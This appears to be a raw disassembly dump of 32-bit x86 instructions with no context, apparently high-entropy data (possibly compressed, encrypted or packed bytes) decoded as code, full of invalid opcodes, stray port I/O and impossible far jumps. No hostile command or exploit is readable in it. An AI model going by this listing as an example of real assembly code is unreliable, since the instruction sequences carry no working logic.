  41dd5a:	fisttp WORD PTR [eax+0x62]
  41dd5d:	pop    esi
  41dd5e:	adc    dl,BYTE PTR [edi]
  41dd60:	mov    ch,BYTE PTR [edi+eax*8-0x1a]
  41dd64:	sbb    BYTE PTR [edx-0x1d],bh
  41dd67:	iret   
  41dd68:	mov    al,0xe9
  41dd6a:	sti    
  41dd6b:	xor    al,BYTE PTR [esi-0x28bc6d57]
  41dd71:	mov    ebx,0x17e25018
  41dd76:	mov    ah,0xec
  41dd78:	jg     0x41ddaa
  41dd7a:	cmp    dl,dh
  41dd7c:	cmp    al,0x21
  41dd7e:	inc    esi
  41dd7f:	mov    bl,0xcd
  41dd81:	imul   edi,DWORD PTR [edx],0x5
  41dd84:	stos   BYTE PTR es:[edi],al
  41dd85:	jb     0x41ddeb
  41dd87:	loopne 0x41dd8d
  41dd89:	call   0xd446d0a4
  41dd8e:	inc    ebp
  41dd8f:	mov    DWORD PTR [edx],ebp
  41dd91:	enter  0xc35d,0x12
  41dd95:	or     edi,DWORD PTR ds:0x89bf7eb8
  41dd9b:	aad    0xc7
  41dd9d:	mov    ebx,0xcde0a94b
  41dda2:	(bad)  
  41dda3:	push   ds
  41dda4:	inc    edx
  41dda5:	mov    dh,0xc1
  41dda7:	xor    DWORD PTR [esi],ebp
  41dda9:	jae    0x41dd6e
  41ddab:	and    al,0x70
  41ddad:	mov    dh,0xf
  41ddaf:	push   ebx
  41ddb0:	outs   dx,BYTE PTR ds:[esi]
  41ddb1:	es pop edx
  41ddb3:	out    0xcd,al
  41ddb5:	fs mov esi,0xeaeeeaaa
  41ddbb:	cmp    bl,al
  41ddbd:	xor    DWORD PTR ds:0xf39f16b3,edx
  41ddc3:	inc    ebx
  41ddc4:	fstp   DWORD PTR [edi-0x5da6ba74]
  41ddca:	or     DWORD PTR [edi+0x73571d29],ebp
  41ddd0:	aam    0x25
  41ddd2:	pop    edi
  41ddd3:	fldcw  WORD PTR [ebp+0x72]
  41ddd6:	shl    BYTE PTR [edx+0x7c],1
  41ddd9:	xchg   ebp,eax
  41ddda:	call   0xdd556689
  41dddf:	fs push ebp
  41dde1:	cwde   
  41dde2:	mov    esp,0x747e7f72
  41dde7:	push   eax
  41dde8:	pop    esi
  41dde9:	sbb    bl,BYTE PTR [ebx+0x2750df0]
  41ddef:	nop
  41ddf0:	ficomp DWORD PTR [ebp-0x49587b39]
  41ddf6:	mov    cl,0xb9
  41ddf8:	adc    eax,DWORD PTR [ecx-0x6b633ab7]
  41ddfe:	cmp    DWORD PTR ds:0xd554c686,esi
  41de04:	outs   dx,DWORD PTR ds:[esi]
  41de05:	push   edi
  41de06:	mov    WORD PTR [ebx+0x54],ss
  41de09:	(bad)  
  41de0a:	ds jo  0x41ddd9
  41de0d:	in     eax,0xe
  41de0f:	xor    DWORD PTR [eax],0x376e513d
  41de15:	dec    edi
  41de16:	mov    edi,0x70917ef3
  41de1b:	add    cl,0x83
  41de1e:	fldcw  WORD PTR [esi+ebx*2-0x78]
  41de22:	jmp    0x41dda6
  41de24:	ret    
  41de25:	scas   al,BYTE PTR es:[edi]
  41de26:	dec    ebx
  41de27:	mov    bh,0x35
  41de29:	repz dec esi
  41de2b:	out    0xd5,eax
  41de2d:	pusha  
  41de2e:	sub    DWORD PTR [ebx+0xe],edx
  41de31:	ins    BYTE PTR es:[edi],dx
  41de32:	loope  0x41de68
  41de34:	push   ebx
  41de35:	push   esi
  41de36:	adc    BYTE PTR [edx-0x7b8ab4f1],ah
  41de3c:	mov    ebp,0x5d402f89
  41de41:	mov    al,0x15
  41de43:	loopne 0x41ddcd
  41de45:	pop    esp
  41de46:	xor    DWORD PTR [eax],eax
  41de48:	lods   al,BYTE PTR ds:[esi]
  41de49:	je     0x41de5b
  41de4b:	sbb    dl,ah
  41de4d:	xchg   edx,eax
  41de4e:	iret   
  41de4f:	or     edi,edx
  41de51:	aad    0xf4
  41de53:	and    ebx,DWORD PTR [eax+0x2ffe3410]
  41de59:	mov    DWORD PTR [esi-0x1ee9bf0a],esi
  41de5f:	test   DWORD PTR [esi-0x236dd6ad],ebp
  41de65:	(bad)  
  41de66:	int3   
  41de67:	inc    ecx
  41de68:	sub    ch,al
  41de6a:	int    0x73
  41de6c:	sbb    ah,ch
  41de6e:	mov    eax,0x57f195ea
  41de73:	cmp    BYTE PTR [ecx+eiz*8+0x79292286],0x28
  41de7b:	jae    0x41de32
  41de7d:	xor    eax,0x13032822
  41de82:	shl    BYTE PTR [edi+0xd],0x3
  41de86:	fucomi st,st(5)
  41de88:	das    
  41de89:	mov    dh,BYTE PTR [edx-0xcaa81e6]
  41de8f:	cmp    DWORD PTR [ebp-0x45],0xe05c3397
  41de96:	sahf   
  41de97:	div    eax
  41de99:	xchg   edi,eax
  41de9a:	hlt    
  41de9b:	sbb    edx,ebp
  41de9d:	xchg   edx,eax
  41de9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de9f:	out    0x12,eax
  41dea1:	mov    bl,0xa
  41dea3:	xchg   esp,eax
  41dea4:	or     eax,0xed32c062
  41dea9:	mov    bh,0x1f
  41deab:	xchg   BYTE PTR [ecx],cl
  41dead:	inc    eax
  41deae:	aaa    
  41deaf:	inc    BYTE PTR [ebx-0x65]
  41deb2:	stc    
  41deb3:	sahf   
  41deb4:	mov    WORD PTR [ebx+edx*2+0x69a18945],gs
  41debb:	add    bl,BYTE PTR [eax+0x245dfc7]
  41dec1:	and    al,0x8f
  41dec3:	out    dx,al
  41dec4:	dec    ecx
  41dec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec6:	lods   al,BYTE PTR ds:[esi]
  41dec7:	pop    esi
  41dec8:	cmp    ah,BYTE PTR [ebx-0x41c0701e]
  41dece:	jnp    0x41df12
  41ded0:	fstp   DWORD PTR [eax]
  41ded2:	cmp    edx,ebp
  41ded4:	fwait
  41ded5:	xchg   esp,eax
  41ded6:	dec    ecx
  41ded7:	fs cli 
  41ded9:	push   es
  41deda:	jge    0x41dee6
  41dedc:	aaa    
  41dedd:	mov    al,0xf
  41dedf:	outs   dx,DWORD PTR ds:[esi]
  41dee0:	sub    eax,0xacd0d0f8
  41dee5:	inc    esp
  41dee6:	inc    edx
  41dee7:	and    BYTE PTR [eax+0x4304d925],0xff
  41deee:	lahf   
  41deef:	int    0xad
  41def1:	mov    ch,0xa6
  41def3:	dec    edi
  41def4:	ds in  eax,0x2e
  41def7:	and    ah,0x45
  41defa:	fbstp  TBYTE PTR [edx+0x3a4f1e94]
  41df00:	stc    
  41df01:	loope  0x41df09
  41df03:	js     0x41df3c
  41df05:	or     esi,ecx
  41df07:	jmp    0x41df0e
  41df09:	mov    ah,0x5f
  41df0b:	popa   
  41df0c:	test   al,0x6
  41df0e:	jge    0x41def9
  41df10:	push   ss
  41df11:	retf   0xd94c
  41df14:	mov    dl,0x28
  41df16:	jle    0x41deaf
  41df18:	jo     0x41df87
  41df1a:	push   es
  41df1b:	cs fwait
  41df1d:	and    BYTE PTR [edi+0x4d],ah
  41df20:	add    bh,BYTE PTR [edi+0x59]
  41df23:	hlt    
  41df24:	jnp    0x41df75
  41df26:	mov    bl,0xda
  41df28:	test   DWORD PTR [eax-0x6576ab2],0x487dd1d9
  41df32:	or     eax,0x5b3a8255
  41df37:	mov    edi,0x1cb749d8
  41df3c:	gs or  eax,0xe02ad11b
  41df42:	test   BYTE PTR [esi],dl
  41df44:	outs   dx,BYTE PTR ds:[esi]
  41df45:	sbb    al,0x4c
  41df47:	mov    cl,0xd0
  41df49:	mov    ch,0xcb
  41df4b:	xchg   ecx,eax
  41df4c:	sub    dl,BYTE PTR [eax+0x46d0a761]
  41df52:	add    eax,0x9132037e
  41df57:	cli    
  41df58:	mov    DWORD PTR [ebx+0x6d],eax
  41df5b:	sub    BYTE PTR [ecx+ebx*1+0x79],0x5c
  41df60:	pusha  
  41df61:	xchg   edi,eax
  41df62:	xlat   BYTE PTR ds:[ebx]
  41df63:	sbb    dh,cl
  41df65:	in     eax,0x4d
  41df67:	dec    ebp
  41df68:	sbb    eax,0x23047cde
  41df6d:	adc    DWORD PTR [ebx],esi
  41df6f:	js     0x41dfef
  41df71:	ins    BYTE PTR es:[edi],dx
  41df72:	or     DWORD PTR ss:[ecx+ecx*4],edi
  41df76:	call   0xf0fc:0xdfa9282d
  41df7d:	jmp    0xe246:0x353a4671
  41df84:	pop    ds
  41df85:	mov    cl,0xa9
  41df87:	xor    esi,DWORD PTR [esi+0x31089f2c]
  41df8d:	arpl   WORD PTR [ebx+0x309373e9],dx
  41df93:	ins    DWORD PTR es:[edi],dx
  41df94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df95:	mov    gs,WORD PTR [ebx-0x73]
  41df98:	jmp    0xc2e0:0xe21a2b8d
  41df9f:	popa   
  41dfa0:	lea    eax,[bp-0x62]
  41dfa4:	jne    0x41df9f
  41dfa6:	aas    
  41dfa7:	pop    es
  41dfa8:	push   ss
  41dfa9:	dec    esp
  41dfaa:	(bad)  
  41dfab:	(bad)
  41dfae:	jns    0x41dfec
  41dfb0:	jge    0x41dfde
  41dfb2:	in     eax,dx
  41dfb3:	icebp  
  41dfb4:	pop    edi
  41dfb5:	fidiv  WORD PTR [edx-0x6d743bee]
  41dfbb:	outs   dx,BYTE PTR ds:[esi]
  41dfbc:	pushf  
  41dfbd:	lods   eax,DWORD PTR ds:[esi]
  41dfbe:	pop    esp
  41dfbf:	inc    DWORD PTR ds:0xfe937fc6
  41dfc5:	jns    0x41dfd9
  41dfc7:	push   esp
  41dfc8:	lods   al,BYTE PTR ds:[esi]
  41dfc9:	sub    ch,bh
  41dfcb:	mov    ds:0x7c784efa,al
  41dfd0:	jnp    0x41e02f
  41dfd2:	push   esp
  41dfd3:	jl     0x41e051
  41dfd5:	aas    
  41dfd6:	cmp    ebp,DWORD PTR [edx]
  41dfd8:	sub    dh,0x11
  41dfdb:	mov    ch,BYTE PTR [edi-0x6e3807c4]
  41dfe1:	xor    al,0x86
  41dfe3:	call   0x19500f45
  41dfe8:	inc    edi
  41dfe9:	test   al,0x7
  41dfeb:	push   eax
  41dfec:	loope  0x41dfb0
  41dfee:	xchg   ebx,eax
  41dfef:	(bad)
  41dff2:	jl     0x41dfbd
  41dff4:	push   ss
  41dff5:	jge    0x41e01c
  41dff7:	mov    ebx,0xe3c237d4
  41dffc:	xor    eax,0x62a3d3ec
  41e001:	test   eax,0x171e1f44
  41e006:	push   ecx
  41e007:	mov    ebx,0x64f84cd7
  41e00c:	push   ds
  41e00d:	dec    edx
  41e00e:	data16 in al,0xba
  41e011:	hlt    
  41e012:	bound  eax,QWORD PTR [edi]
  41e014:	adc    ecx,DWORD PTR ds:0x955ae89c
  41e01a:	xor    BYTE PTR [edx+ebp*4+0x16],dl
  41e01e:	punpckldq mm0,DWORD PTR [esp+ebx*4+0x13]
  41e023:	loop   0x41e07f
  41e025:	sar    BYTE PTR [edx],cl
  41e027:	stos   BYTE PTR es:[edi],al
  41e028:	pop    edi
  41e029:	outs   dx,DWORD PTR ds:[esi]
  41e02a:	pop    ds
  41e02b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e02c:	test   al,0x51
  41e02e:	sbb    DWORD PTR [ecx],ecx
  41e030:	ss ins DWORD PTR es:[edi],dx
  41e032:	sub    eax,0x23b8bb9c
  41e037:	mov    esi,0xcb598414
  41e03c:	mov    esi,0xfe30f8cd
  41e041:	mov    ds:0x3eb22bb9,al
  41e046:	gs inc esi
  41e048:	adc    al,0x9d
  41e04a:	test   esi,edi
  41e04c:	fs test al,0x70
  41e04f:	loopne 0x41e060
  41e051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e053:	fst    QWORD PTR [edi-0x514f8f0]
  41e059:	jne    0x41e027
  41e05b:	push   edi
  41e05c:	xor    al,0x74
  41e05e:	mov    ebp,0xda4d05c9
  41e063:	jmp    edx
  41e065:	sub    al,0x9c
  41e067:	dec    eax
  41e068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e069:	ror    dl,1
  41e06b:	and    BYTE PTR [ebx],0x16
  41e06e:	mov    cl,0xc7
  41e070:	mov    ds:0xe7fbece1,al
  41e075:	inc    edi
  41e076:	or     ah,BYTE PTR [ebp+0x5f]
  41e079:	push   eax
  41e07a:	test   al,0x88
  41e07c:	add    esi,DWORD PTR [edx]
  41e07e:	(bad)  
  41e07f:	add    BYTE PTR [esi+0x7a],cl
  41e082:	inc    ebp
  41e083:	mov    eax,0x4d05bf10
  41e088:	in     eax,0x73
  41e08a:	loope  0x41e061
  41e08c:	test   eax,0xf9a414ca
  41e091:	shl    bh,1
  41e093:	inc    edx
  41e094:	fbld   TBYTE PTR [edx]
  41e096:	(bad)  
  41e097:	or     DWORD PTR [esi*1+0x5fd78ce8],edi
  41e09e:	ja     0x41e06a
  41e0a0:	xchg   eax,ebp
  41e0a2:	jmp    0x8c28:0xe7d78101
  41e0a9:	retf   0x3c88
  41e0ac:	inc    ecx
  41e0ad:	dec    eax
  41e0ae:	ins    DWORD PTR es:[edi],dx
  41e0af:	jmp    0x41e0e3
  41e0b1:	mov    edx,0x7f2360e8
  41e0b6:	test   DWORD PTR [esi-0x4b],ecx
  41e0b9:	aas    
  41e0ba:	arpl   di,si
  41e0bc:	icebp  
  41e0bd:	jl     0x41e0e5
  41e0bf:	dec    edx
  41e0c0:	mov    esp,0x351f4d21
  41e0c5:	out    0x91,eax
  41e0c7:	ins    BYTE PTR es:[edi],dx
  41e0c8:	test   eax,0x9f3a9ca2
  41e0cd:	or     ebx,edx
  41e0cf:	xchg   cl,dl
  41e0d1:	sbb    al,0x3
  41e0d3:	inc    eax
  41e0d4:	je     0x41e06e
  41e0d6:	fsub   DWORD PTR [esi-0x41]
  41e0d9:	imul   BYTE PTR [eax-0x26]
  41e0dc:	pop    ecx
  41e0dd:	iret   
  41e0de:	fs out 0x30,eax
  41e0e1:	inc    esp
  41e0e2:	mov    ebx,esi
  41e0e4:	push   edx
  41e0e5:	aad    0x23
  41e0e7:	es arpl sp,ax
  41e0ea:	in     eax,dx
  41e0eb:	pop    ecx
  41e0ec:	ret    
  41e0ed:	pop    ss
  41e0ee:	push   ecx
  41e0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f0:	enter  0xdcd4,0x15
  41e0f4:	addr16 mov ds:0xb811,eax
  41e0f8:	cmp    BYTE PTR [ecx],bl
  41e0fa:	cmp    eax,0x57ee780e
  41e0ff:	ins    DWORD PTR es:[edi],dx
  41e100:	repz inc ebp
  41e102:	add    ch,ch
  41e104:	cld    
  41e105:	cmp    ch,BYTE PTR [eax+edi*4]
  41e108:	repnz mov eax,ds:0x2d8f8f42
  41e10e:	mov    cl,0x52
  41e110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e111:	adc    DWORD PTR [ebp-0x46],edi
  41e114:	mov    esi,0xd785ecc2
  41e119:	adc    ebx,edi
  41e11b:	cwde   
  41e11c:	pop    ebx
  41e11d:	push   esi
  41e11e:	loopne 0x41e152
  41e120:	je     0x41e0e2
  41e122:	cmp    ah,bl
  41e124:	xchg   edx,eax
  41e125:	js     0x41e199
  41e127:	lods   al,BYTE PTR ds:[esi]
  41e128:	mov    dh,0x2e
  41e12a:	xor    BYTE PTR [esi+esi*8+0x5f],bh
  41e12e:	sub    DWORD PTR [ebp-0x69ecb64b],0x74
  41e135:	ficom  DWORD PTR [ecx+ebx*1-0x3fa5595e]
  41e13c:	sbb    ah,BYTE PTR [edi+ecx*4]
  41e13f:	(bad)  [esi+0x246f467e]
  41e145:	in     al,0xd3
  41e147:	clc    
  41e148:	js     0x41e143
  41e14a:	lahf   
  41e14b:	mov    al,0xd3
  41e14d:	mov    al,ds:0xfa344fb8
  41e152:	sahf   
  41e153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e154:	gs mov eax,0xb772ec62
  41e15a:	inc    ebp
  41e15b:	add    BYTE PTR [esi+0x2103773e],bh
  41e161:	and    eax,0x38fb8480
  41e166:	xor    DWORD PTR [ecx],ebp
  41e168:	clc    
  41e169:	xchg   edi,eax
  41e16a:	data16 (bad) 
  41e16c:	or     ebx,esp
  41e16e:	ins    DWORD PTR es:[edi],dx
  41e16f:	jbe    0x41e166
  41e171:	push   esi
  41e172:	pop    ebp
  41e173:	pop    edx
  41e174:	mov    esp,0xb642e337
  41e179:	adc    al,0xc
  41e17b:	dec    esi
  41e17c:	daa    
  41e17d:	push   edx
  41e17e:	pop    ecx
  41e17f:	jno    0x41e196
  41e181:	lock aam 0xb7
  41e184:	adc    BYTE PTR [esi],al
  41e186:	int3   
  41e187:	pusha  
  41e188:	push   0xad3cd03b
  41e18d:	shl    DWORD PTR [eax+edi*8],0xa6
  41e191:	push   es
  41e192:	das    
  41e193:	cwde   
  41e194:	cdq    
  41e195:	fwait
  41e196:	dec    esp
  41e197:	xchg   edx,eax
  41e198:	inc    eax
  41e199:	sbb    BYTE PTR [ebp-0xf],bl
  41e19c:	cld    
  41e19d:	pusha  
  41e19e:	or     BYTE PTR [esi],0x6e
  41e1a1:	call   0x28c3:0xba445a36
  41e1a8:	loop   0x41e17b
  41e1aa:	inc    ebx
  41e1ab:	push   edx
  41e1ac:	pop    edi
  41e1ad:	pop    ecx
  41e1ae:	xchg   ch,al
  41e1b0:	sub    dh,BYTE PTR [edx-0x4d329d63]
  41e1b6:	fcomp  QWORD PTR [eax+ebp*8-0x6f53b46f]
  41e1bd:	jl     0x41e178
  41e1bf:	je     0x41e1c6
  41e1c1:	(bad)  
  41e1c2:	loope  0x41e151
  41e1c4:	xchg   edx,eax
  41e1c5:	push   es
  41e1c6:	(bad)  
  41e1c7:	int3   
  41e1c8:	xor    dl,BYTE PTR [esi+0x3a]
  41e1cb:	(bad)  
  41e1cc:	lds    ecx,FWORD PTR gs:[ecx-0x6ebea9ab]
  41e1d3:	xchg   DWORD PTR [ecx+0x3fe7e8ce],edi
  41e1d9:	or     al,0x27
  41e1db:	std    
  41e1dc:	out    dx,al
  41e1dd:	xor    ebp,DWORD PTR [edx+0x485316b0]
  41e1e3:	stos   BYTE PTR es:[edi],al
  41e1e4:	pop    edi
  41e1e5:	mov    esp,0xa0890864
  41e1ea:	pop    ebx
  41e1eb:	mov    ch,0x4e
  41e1ed:	pushf  
  41e1ee:	push   ss
  41e1ef:	add    al,0xf4
  41e1f1:	mov    bh,BYTE PTR [esi]
  41e1f3:	sub    DWORD PTR [ebx+0x29],edi
  41e1f6:	jb     0x41e26f
  41e1f8:	xor    BYTE PTR [ebp+0x1559a574],al
  41e1fe:	das    
  41e1ff:	push   ds
  41e200:	outs   dx,DWORD PTR ds:[esi]
  41e201:	pop    ebp
  41e202:	out    dx,eax
  41e203:	mov    cl,0xf4
  41e205:	je     0x41e238
  41e207:	pop    edi
  41e208:	jle    0x41e1c2
  41e20a:	fistp  DWORD PTR es:[ecx]
  41e20e:	add    eax,DWORD PTR [edi+0x1d9bc3b0]
  41e214:	or     DWORD PTR [edx],ebx
  41e216:	push   ds
  41e217:	jno    0x41e269
  41e219:	mov    bh,0xb
  41e21b:	and    dl,BYTE PTR [ebp+edx*8-0x63]
  41e21f:	dec    eax
  41e220:	and    al,0x1a
  41e222:	in     eax,dx
  41e223:	inc    ecx
  41e224:	fdiv   QWORD PTR [eax-0x6f771fe0]
  41e22a:	and    eax,0xad01d718
  41e22f:	inc    ecx
  41e230:	mov    ah,0x76
  41e232:	sbb    DWORD PTR [ecx+0x4e],ecx
  41e235:	cmc    
  41e236:	mov    dh,0x52
  41e238:	test   DWORD PTR [eax+ebx*1],esi
  41e23b:	lods   eax,DWORD PTR ds:[esi]
  41e23c:	inc    ebx
  41e23d:	jae    0x41e248
  41e23f:	mov    esp,0xd15a743b
  41e245:	jne    0x41e202
  41e247:	not    DWORD PTR [eax]
  41e249:	in     eax,dx
  41e24a:	jecxz  0x41e216
  41e24c:	rol    BYTE PTR [ebx+0x23],0xba
  41e250:	into   
  41e251:	mov    edx,0x7c35033f
  41e256:	aas    
  41e257:	mov    ecx,0xf35e1249
  41e25c:	dec    edi
  41e25d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e25e:	lds    ebp,FWORD PTR [ebp+0x37868e79]
  41e264:	or     eax,0xef712758
  41e269:	cmc    
  41e26a:	div    dh
  41e26c:	pop    esi
  41e26d:	ficomp WORD PTR [eiz*2+0x7d32a88d]
  41e274:	cmp    al,0x99
  41e276:	or     BYTE PTR [edx+0x3a],dh
  41e279:	fidiv  DWORD PTR ds:0xa45886bb
  41e27f:	inc    esi
  41e280:	aam    0x28
  41e282:	or     DWORD PTR [edi],ebx
  41e284:	stos   BYTE PTR es:[edi],al
  41e285:	fild   WORD PTR [ecx-0x5a277938]
  41e28b:	sub    eax,0xcb99b827
  41e290:	jl     0x41e2e2
  41e292:	int    0x4f
  41e294:	jl     0x41e302
  41e296:	retf   0xaa62
  41e299:	adc    BYTE PTR [edx],ch
  41e29b:	xor    DWORD PTR [eax],ebp
  41e29d:	dec    edi
  41e29e:	push   cs
  41e29f:	movlps xmm1,QWORD PTR [esp+eax*2-0x360625f6]
  41e2a7:	dec    edx
  41e2a8:	nop
  41e2a9:	pusha  
  41e2aa:	add    al,0x1d
  41e2ac:	inc    edx
  41e2ad:	mov    al,0x48
  41e2af:	sub    eax,0x7abd3558
  41e2b4:	stos   BYTE PTR es:[edi],al
  41e2b5:	test   eax,0xa0ecbd45
  41e2ba:	cs popa 
  41e2bc:	addr16 jl 0x41e272
  41e2bf:	pop    ebx
  41e2c0:	adc    eax,0xa9ac79e6
  41e2c5:	adc    eax,0x52311d4
  41e2ca:	data16 scas al,BYTE PTR es:[edi]
  41e2cc:	test   BYTE PTR [esi*8-0x44d64cba],0x15
  41e2d4:	pop    esi
  41e2d5:	and    edi,edx
  41e2d7:	sbb    al,ch
  41e2d9:	xor    eax,0x1e9eaf61
  41e2de:	dec    eax
  41e2df:	pop    ebx
  41e2e0:	idiv   BYTE PTR [ebx-0x59]
  41e2e3:	mov    esi,0x8656ed21
  41e2e8:	and    cl,BYTE PTR [eax+0x25a7e017]
  41e2ee:	jmp    0x41e2a0
  41e2f0:	xor    esp,esp
  41e2f2:	or     bh,ch
  41e2f4:	sub    ah,al
  41e2f6:	sub    al,0x1c
  41e2f8:	or     BYTE PTR [edi-0x2e],0x27
  41e2fc:	sub    ebx,DWORD PTR [ebp*2-0x761dc652]
  41e303:	jecxz  0x41e339
  41e305:	(bad)
  41e308:	dec    ebx
  41e309:	inc    ecx
  41e30a:	dec    edx
  41e30b:	test   DWORD PTR ds:0xd6732f2b,ebp
  41e311:	dec    edi
  41e312:	sti    
  41e313:	push   edx
  41e314:	lock dec ebp
  41e316:	cli    
  41e317:	mov    al,0xfa
  41e319:	lds    eax,FWORD PTR [ebp+0x32a43b40]
  41e31f:	mov    ah,0xad
  41e321:	cmp    DWORD PTR [ebx],esi
  41e323:	cmp    DWORD PTR [esi],esp
  41e325:	je     0x41e2bc
  41e327:	cli    
  41e328:	into   
  41e329:	retf   0xb9b9
  41e32c:	jne    0x41e32e
  41e32e:	pop    ecx
  41e32f:	push   0x3ee377fa
  41e334:	sub    DWORD PTR [ebp+0x26],esi
  41e337:	jo     0x41e318
  41e339:	inc    BYTE PTR [ecx+0x65]
  41e33c:	inc    esi
  41e33d:	sahf   
  41e33e:	and    DWORD PTR [ebp+0x64],edi
  41e341:	mov    al,0x30
  41e343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e344:	loope  0x41e2de
  41e346:	inc    ebx
  41e347:	das    
  41e348:	sub    BYTE PTR [ecx-0xa],cl
  41e34b:	xor    esi,DWORD PTR ds:0x5227a193
  41e351:	and    cl,BYTE PTR [eax]
  41e353:	pusha  
  41e354:	mov    ecx,0x84caec3c
  41e359:	scas   al,BYTE PTR es:[edi]
  41e35a:	fisubr DWORD PTR [edi+0x460536ab]
  41e360:	push   ss
  41e361:	jnp    0x41e3b9
  41e363:	xchg   edi,eax
  41e364:	pop    es
  41e365:	repnz (bad) 
  41e367:	sbb    bl,BYTE PTR ds:0x143f6eb5
  41e36d:	jns    0x41e337
  41e36f:	sub    DWORD PTR [ebp+0x68cda79c],esi
  41e375:	mov    dl,0x0
  41e377:	aas    
  41e378:	(bad)
  41e37d:	push   cs
  41e37e:	cwde   
  41e37f:	fisttp QWORD PTR [esp+eax*2]
  41e382:	ret    0x9071
  41e385:	mov    dh,0xfd
  41e387:	out    0x5b,eax
  41e389:	xrelease xchg BYTE PTR [esi+0x4239e66a],dh
  41e390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e392:	or     ah,bl
  41e394:	mov    ds:0xe8778ba1,eax
  41e399:	mov    dh,0x25
  41e39b:	loop   0x41e40d
  41e39d:	and    DWORD PTR [esi-0x29d4c66c],esp
  41e3a3:	dec    edi
  41e3a4:	xchg   esi,eax
  41e3a5:	mov    dh,0x54
  41e3a7:	or     al,0xfa
  41e3a9:	cmp    BYTE PTR [esi+ebp*4+0x5f],0xa2
  41e3ae:	push   edx
  41e3af:	and    ch,ah
  41e3b1:	mov    esi,DWORD PTR [ebx-0x5e]
  41e3b4:	mov    ds:0xd60faf45,al
  41e3b9:	dec    ebx
  41e3ba:	sbb    DWORD PTR ds:0xff88c44e,ebx
  41e3c0:	jne    0x41e41a
  41e3c2:	dec    ebp
  41e3c3:	pop    esi
  41e3c4:	sbb    al,0xba
  41e3c6:	xlat   BYTE PTR ds:[ebx]
  41e3c7:	inc    edi
  41e3c8:	add    esp,ebp
  41e3ca:	pop    es
  41e3cb:	and    eax,0x8995c896
  41e3d0:	mov    DWORD PTR [edi],ebp
  41e3d2:	push   cs
  41e3d3:	cld    
  41e3d4:	mov    ah,0xb6
  41e3d6:	(bad)  
  41e3d7:	hlt    
  41e3d8:	inc    edi
  41e3d9:	pusha  
  41e3da:	fild   QWORD PTR [edi+0x62053b9d]
  41e3e0:	inc    ebp
  41e3e1:	xchg   BYTE PTR [ebp+0x2bc2abaf],bl
  41e3e7:	outs   dx,BYTE PTR ds:[esi]
  41e3e8:	das    
  41e3e9:	pop    es
  41e3ea:	retf   0xcdf1
  41e3ed:	ins    DWORD PTR es:[edi],dx
  41e3ee:	rcr    BYTE PTR [ebp-0x56],1
  41e3f1:	jmp    0x41e3dd
  41e3f3:	fsubr  st(1),st
  41e3f5:	adc    esi,DWORD PTR [esi+ebp*1-0x3a]
  41e3f9:	lds    ebx,FWORD PTR [edx-0x4ea9e8af]
  41e3ff:	sbb    al,0x9
  41e401:	iret   
  41e402:	ret    
  41e403:	cmp    DWORD PTR [ebx+0x5a],ebp
  41e406:	outs   dx,DWORD PTR ds:[esi]
  41e407:	test   DWORD PTR [esi+ecx*8+0x7d],ebx
  41e40b:	adc    ebx,esi
  41e40d:	xor    eax,0x494c2d56
  41e412:	push   0x45277da7
  41e417:	std    
  41e418:	and    ebp,DWORD PTR [ecx]
  41e41a:	sar    dh,0xad
  41e41d:	sub    bl,BYTE PTR [edx+0x3aaa087c]
  41e423:	xchg   esp,eax
  41e424:	retf   0x5fa8
  41e427:	mov    ch,0xbc
  41e429:	xor    eax,0xf12313c0
  41e42e:	jmp    0x3df0a8ed
  41e433:	mov    esp,0xc2fa8e7c
  41e438:	out    0x46,eax
  41e43a:	xor    eax,0x56812a98
  41e43f:	xor    al,0xb1
  41e441:	sub    al,0xd
  41e443:	jle    0x41e4a3
  41e445:	bound  ebp,QWORD PTR [edi-0x270759e9]
  41e44b:	or     al,0xc
  41e44d:	sub    al,0xfa
  41e44f:	popa   
  41e450:	pop    ecx
  41e451:	(bad)  
  41e452:	mov    edx,0x6dfaed13
  41e457:	add    al,0xb2
  41e459:	es jo  0x41e4a6
  41e45c:	pushf  
  41e45d:	push   0x67
  41e45f:	add    eax,0x71a0429e
  41e464:	pop    ebx
  41e465:	aaa    
  41e466:	rcl    bh,cl
  41e468:	push   0x93889006
  41e46d:	mov    ah,0xdf
  41e46f:	ds repz push cs
  41e472:	xchg   esp,eax
  41e473:	pusha  
  41e474:	mov    edx,0xe9efbee8
  41e479:	mov    ebp,0x517fcd30
  41e47e:	inc    esi
  41e47f:	(bad)  
  41e480:	mov    al,BYTE PTR [ecx-0x7df2ccc6]
  41e486:	call   0xfc1fbea5
  41e48b:	pushf  
  41e48c:	inc    esi
  41e48d:	imul   ebx,esp,0xffffffb7
  41e490:	mov    edi,DWORD PTR [ebx+0x12827068]
  41e496:	out    0xea,eax
  41e498:	xor    cl,BYTE PTR [edi-0x50b3f649]
  41e49e:	stos   DWORD PTR es:[edi],eax
  41e49f:	rol    DWORD PTR ds:0xe2969d2c,0xb3
  41e4a6:	retf   0x9c50
  41e4a9:	and    BYTE PTR ds:0x7b1f9fbd,0xcf
  41e4b0:	cs push eax
  41e4b2:	je     0x41e4a9
  41e4b4:	pop    ecx
  41e4b5:	mov    cl,0x3
  41e4b7:	mov    ds:0x962b27fd,eax
  41e4bc:	out    0xec,eax
  41e4be:	dec    eax
  41e4bf:	mov    ecx,0x5d1bb927
  41e4c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4c5:	cwde   
  41e4c6:	aaa    
  41e4c7:	(bad)
  41e4ca:	add    eax,0x84e2e3c6
  41e4cf:	mov    ebp,0xd6cfdcf4
  41e4d4:	mov    ecx,0x4d5f56b4
  41e4d9:	ds into 
  41e4db:	jns    0x41e4cd
  41e4dd:	rol    BYTE PTR [eax+0x2c622485],cl
  41e4e3:	jp     0x41e493
